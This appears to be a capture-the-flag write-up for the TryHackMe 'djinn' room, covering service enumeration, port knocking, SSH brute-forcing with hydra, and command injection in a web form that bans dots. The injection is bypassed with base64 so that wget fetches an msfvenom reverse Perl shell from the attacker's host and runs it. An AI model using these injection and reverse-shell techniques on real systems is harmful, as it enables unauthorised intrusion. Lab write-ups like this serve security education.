# djinn Room

### Introduction

Room hosted at https://tryhackme.com/

I saw there are no write-ups for this one any maybe some of you need it. I will try to include my failed tries as well somehow in the story. It's usually not as straightforward as in the writeup. I also spend some time creating the custom script which you will see.

### Enumeration 

```
hack3rman@kali:~$ nmap -sT -sV 10.10.146.45 -p-
21/tcp   open  ftp     vsftpd 3.0.3
1337/tcp open  waste?
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
```

So we have FTP, an unknown service and what seems to be a web site server.

### Recon

Lets take each service in order.

##### FTP (21)

```
hack3rman@kali:~/TryHackMe/djin$ ftp 10.10.146.45
Connected to 10.10.146.45.
220 (vsFTPd 3.0.3)
Name (10.10.146.45:hack3rman): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
```
The files gives us some credentials, a possible username and some infrmation about the 1337 port.

I created a mix of the usernames and passwords based on combinations from the files and tried hydra to check them out on FTP. No match. Ok, let's move on.

##### Game (1337)

```
hack3rman@kali:~/TryHackMe/djin$ nc  10.10.146.45 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(8, '-', 6)
> 2
(6, '-', 9)
> -3
(6, '*', 9)
> x
Stop acting like a hacker for a damn minute!!

```
Playing around with the game we find that we need to supply the correct answer to the supplied arithmetic operation 1000 times to get something in return. Time for some python scripting.

... some hours later...
https://github.com/hack3rman/TryHackMe/blob/master/calc.py

I strongly encourage you to write your own script. You might try python3 for example. I tried but had some issues with the socket methods which expected binary data. I attached my script to be user for roadmap for example.

Now, we run the script and 1000 operations later:
```
Operation number 1000
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

What could this be? They might be some ASCII characters encoded in hex or decimal? Let's try it out. 
https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
After playing with the numbers a bit on the converter it seems not all can be decoded. Maybe something else?

They do look like port numbers. And I did another room on THB where I did learn about port knocking: https://tryhackme.com/room/lordoftheroot

I tried it with nmap. Connect scan and no port randomization (-r)
```
hack3rman@kali:~/TryHackMe/djin$ nmap -sT 10.10.146.45 -p1356,6784,3409 -r
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 07:29 EDT
Nmap scan report for 10.10.146.45
Host is up (0.061s latency).

PORT     STATE  SERVICE
1356/tcp closed cuillamartin
3409/tcp closed networklens
6784/tcp closed bfd-lag

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds

hack3rman@kali:~/TryHackMe/djin$ nmap -sT 10.10.146.45 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 07:29 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.10.146.45
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
7331/tcp open  swx
```
Look! Port 22 is opened now. Cool. We can try those credentials again.

```
hack3rman@kali:~/TryHackMe/djin$ hydra ssh://10.10.146.45 -Lusers -Ppass
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-09 07:32:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 84 login tries (l:7/p:12), ~6 tries per task
[DATA] attacking ssh://10.10.146.45:22/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-09 07:32:30
```
Oh no. This doesn't work either. Let's continue to the web service then. But we gathered some info which might be of use later.

##### Web (7331)

First I look at the home page. Nothing really there. Check the source out. (always check the source :D) I have access to one of the CSS files but nothing intresting. I tried to walk in the upper dirs. Still nonthing. Try harder!

It seems `dirb` which I usually scan http(s) websites with does not support custom ports (or I haven't figured it out yet). So for now I am using OWASP ZAP with the worldlists from dirb.
The common worldlist doesn't hit anything. Let's try the big one.

Oh nice! I found 2 pages `wish` and `genie`.

Visiting `wish` looks like you can send commands over. Let's try `ls` command. Ok we are redirected to the genie webpage but with the message "The area is forbidden". Maybe we can authenticate with the credentials somehow. Lets see the source. Wait. There is some extra data there.
```
app.py
app.pyc
static
templates
```
The same data is in the redirect link. So our comand works? Let's `echo "dang. I am one step closer"`. Hmm. We get "Wrong choice of words" back. `echo 1`. Works. Let's remove the `"`. Still wrong. Let's remove `.`. Works. Apparenly I cannot use `.` in the data I send. Now my next step would be to send a curl command to download a reverse connection script and launch it. But I can't use `.`. We somehow need to avoid dots.

NOTE! At this point with all the data changes and the fact the wish page was redirecting I switched to use OWASP where I could modify the data in the **Manual Request Editor** and see the response directly. 

### Exploiting ?

Now let's try command substitution. ``cmd=echo `echo 1` ``. This works. Next step is to try base64 encoding of my `wget` command.

```
hack3rman@kali:~/TryHackMe/djin$ msfvenom -p cmd/unix/reverse_perl LHOST=10.7.0.255 LPORT=4444 -o perl.pl
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 229 bytes
Saved as: perl.pl

hack3rman@kali:~/TryHackMe/djin$ echo -n wget 10.7.0.255:8000/perl.pl | base64
d2dldCAxMC43LjAuMjU1OjgwMDAvcGVybC5wbA==

hack3rman@kali:~/TryHackMe/djin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We have the file ready and the encoded comand. We will send it to the web server. `` cmd=`echo d2dldCAxMC43LjAuMjU1OjgwMDAvcGVybC5wbA== | base64 -d` ``. Let's list files again `cmd=ls`. Nice!
```
app.py
app.pyc
perl.pl
static
templates
```

Now we just run the file `cmd=bash perl.pl`. I realized that I could have ommited the dot in the file name for launching directly. Instead we need to encode this command as well as it contains the dot :(.
```
hack3rman@kali:~/TryHackMe/djin$ echo -e  bash perl.pl | base64
YmFzaCBwZXJsLnBsCg==
```
Sending this data to the server in the `wish` page `` cmd=`echo YmFzaCBwZXJsLnBsCg== | base64 -d` ``

Don't forget to fire a listener on the local machine! :)

Now I try to upgrade the shell to a fully working one with `socat`. I think I could have done this from the beginning (instead of perl) but this is how it went today...

```
www-data@djinn:/opt/80$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Good. We are in. In no particular order I usually check these first
1. suid binaries
2. programs running as root
3. /home and /root dirs
4. sudo commands

```
www-data@djinn:/opt/80$ find /home
/home
/home/nitish
/home/nitish/.cache
find: ‘/home/nitish/.cache’: Permission denied
/home/nitish/user.txt
/home/nitish/.gnupg
find: ‘/home/nitish/.gnupg’: Permission denied
/home/nitish/.bashrc
/home/nitish/.dev
/home/nitish/.dev/creds.txt
/home/nitish/.bash_history
/home/sam
```

Usually I am not this lucky but it seems we can read `/home/nitish/.dev/creds.txt`. Intresting. Since we already opened the `ssh` port we might as well try to connect.
```
nitish@djinn:~$ ls -l /home/nitish/user.txt 
-rw-r----- 1 nitish nitish 33 Nov 12 17:29 /home/nitish/user.txt
```
And we get the user flag. :D Cool!

